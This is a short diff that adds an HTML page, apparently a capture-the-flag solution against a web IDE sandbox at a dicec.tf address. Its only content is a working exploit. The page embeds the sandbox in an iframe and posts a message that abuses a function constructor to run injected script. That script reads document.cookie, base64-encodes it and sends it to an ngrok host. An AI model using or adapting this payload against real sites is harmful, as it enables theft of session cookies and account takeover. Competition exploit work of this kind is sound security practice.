@@ -1,0 +1,6 @@
+<iframe id=sand src=https://web-ide.dicec.tf/sandbox.html></iframe>
+<script>
+  onload = () => {
+    sand.contentWindow.postMessage(`log.constructor('fetch("https://b9be14aa2cf4.ngrok.io/b64/" + btoa(document.cookie));')()`, '*');
+  };
+</script>
